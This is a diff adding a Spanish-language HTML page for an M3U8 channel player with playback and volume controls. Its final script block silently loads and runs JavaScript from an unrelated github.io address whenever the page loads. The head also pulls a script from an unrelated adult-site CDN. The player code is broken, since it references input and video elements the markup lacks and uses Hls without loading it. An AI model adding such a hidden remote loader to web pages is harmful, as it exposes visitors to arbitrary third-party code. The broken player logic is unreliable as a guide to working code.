@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<script src="https://cdn1d-static-shared.phncdn.com/html5player/videoPlayer/es6player/9.1.0/mobile-player.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reproductor M3U8 Móvil</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { padding: 1rem; background: #1a1a1a; color: white; }
+        .container { max-width: 100%; margin: 0 auto; }
+        #fileInput { margin-bottom: 1rem; padding: 0.5rem; width: 100%; background: #2d2d2d; border: none; border-radius: 4px; color: white; }
+        #controls { display: flex; flex-wrap: wrap; gap: 0.5rem; margin: 1rem 0; }
+        .control-btn { flex: 1 1 30%; padding: 0.8rem; border: none; border-radius: 4px; background: #007bff; color: white; cursor: pointer; font-size: 1rem; }
+        .control-btn:hover { background: #0056b3; }
+        .volume-display { flex: 1 1 100%; text-align: center; padding: 0.5rem; background: #2d2d2d; border-radius: 4px; margin-top: 0.5rem; }
+        #channelList { list-style: none; margin: 1rem 0; max-height: 30vh; overflow-y: auto; border-radius: 4px; }
+        #channelList li { padding: 0.8rem; background: #2d2d2d; margin-bottom: 0.5rem; border-radius: 4px; cursor: pointer; }
+        #channelList li:hover { background: #3d3d3d; }
+        video { width: 100%; height: auto; border-radius: 4px; background: black; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        
+        
+        <div id="controls" style="display: none;">
+            <button class="control-btn" id="loopBtn">🔁 Bucle (Desactivado)</button>
+            <button class="control-btn" id="fullscreenBtn">📺 Pantalla Completa</button>
+            <button class="control-btn" id="muteBtn">🔊 Silencio (Desactivado)</button>
+            <button class="control-btn" id="volumeUpBtn">🔊 Subir Volumen</button>
+            <button class="control-btn" id="volumeDownBtn">🔉 Bajar Volumen</button>
+            <div class="volume-display" id="volumeDisplay">Volumen actual: 100%</div>
+        </div>
+        
+        <ul id="channelList"></ul>
+        
+    </div>
+
+    <script>
+        const fileInput = document.getElementById('fileInput');
+        const channelList = document.getElementById('channelList');
+        const player = document.getElementById('player');
+        const loopBtn = document.getElementById('loopBtn');
+        const fullscreenBtn = document.getElementById('fullscreenBtn');
+        const muteBtn = document.getElementById('muteBtn');
+        const volumeUpBtn = document.getElementById('volumeUpBtn');
+        const volumeDownBtn = document.getElementById('volumeDownBtn');
+        const volumeDisplay = document.getElementById('volumeDisplay');
+        const controlsDiv = document.getElementById('controls');
+        let channels = [];
+        let isLoopActive = false;
+        let isMuted = false;
+        const VOLUME_STEP = 0.1; // Aumento/disminución del 10% por clic
+
+        // Cargar y parsear el archivo M3U8
+        fileInput.addEventListener('change', (e) => {
+            const file = e.target.files[0];
+            if (!file || !['.m3u', '.m3u8'].includes(file.name.slice(-4).toLowerCase())) {
+                alert('Selecciona un archivo M3U o M3U8 válido');
+                return;
+            }
+
+            const reader = new FileReader();
+            reader.onload = (event) => {
+                const content = event.target.result;
+                channels = parseM3U(content);
+                renderChannelList();
+                controlsDiv.style.display = 'flex'; // Mostrar controles cuando hay canales
+                updateVolumeDisplay();
+            };
+            reader.readAsText(file);
+        });
+
+        // Parseador de M3U8
+        function parseM3U(content) {
+            const lines = content.split('\n');
+            const parsedChannels = [];
+            let currentChannel = {};
+
+            for (const line of lines) {
+                const trimmedLine = line.trim();
+                if (trimmedLine.startsWith('#EXTINF:')) {
+                    const nameMatch = trimmedLine.match(/"([^"]+)"/) || trimmedLine.match(/,(.+)/);
+                    currentChannel.name = nameMatch ? nameMatch[1].trim() : 'Canal sin nombre';
+                } else if (trimmedLine && !trimmedLine.startsWith('#')) {
+                    currentChannel.url = decodeURIComponent(trimmedLine);
+                    parsedChannels.push(currentChannel);
+                    currentChannel = {};
+                }
+            }
+            return parsedChannels;
+        }
+
+        // Renderizar lista de canales
+        function renderChannelList() {
+            channelList.innerHTML = '';
+            channels.forEach((channel, index) => {
+                const li = document.createElement('li');
+                li.textContent = `${index + 1}. ${channel.name}`;
+                li.addEventListener('click', () => playChannel(channel.url));
+                channelList.appendChild(li);
+            });
+        }
+
+        // Reproducir canal
+        function playChannel(url) {
+            if (Hls.isSupported()) {
+                if (player.hls) player.hls.destroy();
+                const hls = new Hls();
+                hls.loadSource(url);
+                hls.attachMedia(player);
+            } else if (player.canPlayType('application/vnd.apple.mpegurl')) {
+                player.src = url;
+            } else {
+                alert('Tu navegador no soporta la reproducción de M3U8');
+            }
+            player.loop = isLoopActive;
+            player.muted = isMuted;
+            player.play();
+        }
+
+        // Actualizar visualización del volumen
+        function updateVolumeDisplay() {
+            const volumePercent = Math.round(player.volume * 100);
+            volumeDisplay.textContent = `Volumen actual: ${volumePercent}%`;
+        }
+
+        // Control de bucle
+        loopBtn.addEventListener('click', () => {
+            isLoopActive = !isLoopActive;
+            player.loop = isLoopActive;
+            loopBtn.textContent = isLoopActive ? '🔁 Bucle (Activado)' : '🔁 Bucle (Desactivado)';
+        });
+
+        // Control de pantalla completa
+        fullscreenBtn.addEventListener('click', () => {
+            if (player.requestFullscreen) {
+                player.requestFullscreen();
+            } else if (player.webkitRequestFullscreen) {
+                player.webkitRequestFullscreen();
+            } else if (player.msRequestFullscreen) {
+                player.msRequestFullscreen();
+            }
+        });
+
+        // Control de silencio
+        muteBtn.addEventListener('click', () => {
+            isMuted = !isMuted;
+            player.muted = isMuted;
+            muteBtn.textContent = isMuted ? '🔊 Silencio (Activado)' : '🔊 Silencio (Desactivado)';
+            updateVolumeDisplay();
+        });
+
+        // Control de subir volumen
+        volumeUpBtn.addEventListener('click', () => {
+            if (player.volume < 1) {
+                player.volume = Math.min(1, player.volume + VOLUME_STEP);
+                isMuted = false;
+                player.muted = false;
+                muteBtn.textContent = '🔊 Silencio (Desactivado)';
+                updateVolumeDisplay();
+            }
+        });
+
+        // Control de bajar volumen
+        volumeDownBtn.addEventListener('click', () => {
+            if (player.volume > 0) {
+                player.volume = Math.max(0, player.volume - VOLUME_STEP);
+                isMuted = false;
+                player.muted = false;
+                muteBtn.textContent = '🔊 Silencio (Desactivado)';
+                updateVolumeDisplay();
+            }
+        });
+    </script>
+    <script>
+    javascript:(function(){function cargarMiScript(){let s=document.createElement('script');s.src='https://sacanario88.github.io/Wey/Js/ini.js';document.head.appendChild(s);}cargarMiScript();})()
+    </script>
+</body>
+</html>
